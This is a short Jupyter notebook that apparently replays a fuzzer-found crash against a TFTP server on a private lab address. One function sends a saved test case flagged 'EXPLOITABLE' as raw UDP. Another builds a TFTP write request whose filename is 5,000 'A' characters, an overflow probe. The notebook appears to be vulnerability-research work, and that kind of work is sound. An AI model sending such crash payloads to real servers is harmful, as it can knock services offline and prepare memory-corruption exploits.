{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 176,
   "metadata": {},
   "outputs": [],
   "source": [
    "with open(\"./logs/tftp.xml_20190123014140/Faults/EXPLOITABLE_0x5e017101_0x6d096657/11/1.Initial.Action.bin\",\"rb\") as f:\n",
    "    data = f.read()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 179,
   "metadata": {},
   "outputs": [],
   "source": [
    "def send_raw(filename):\n",
    "    import socket\n",
    "    target_ip = \"192.168.84.25\"\n",
    "    target_port = 69\n",
    "    server_address = (target_ip, target_port)\n",
    "    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:\n",
    "        sent = sock.sendto(filename, server_address)\n",
    "        print(sent)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 180,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "1842\n"
     ]
    }
   ],
   "source": [
    "send_raw(data)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 169,
   "metadata": {},
   "outputs": [],
   "source": [
    "def send(filename):\n",
    "    import socket\n",
    "    target_ip = \"192.168.84.25\"\n",
    "    target_port = 69\n",
    "    server_address = (target_ip, target_port)\n",
    "    mode = b\"netascii\"\n",
    "    message = b\"\\x00\\x02\" + filename + b\"\\x00\" + mode+ b\"\\x00\"\n",
    "    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:\n",
    "        sent = sock.sendto(message, server_address)\n",
    "        print(sent)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 170,
   "metadata": {},
   "outputs": [],
   "source": [
    "filename = b\"A\"*5000"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 175,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "5012\n"
     ]
    }
   ],
   "source": [
    "send(filename)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.2"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
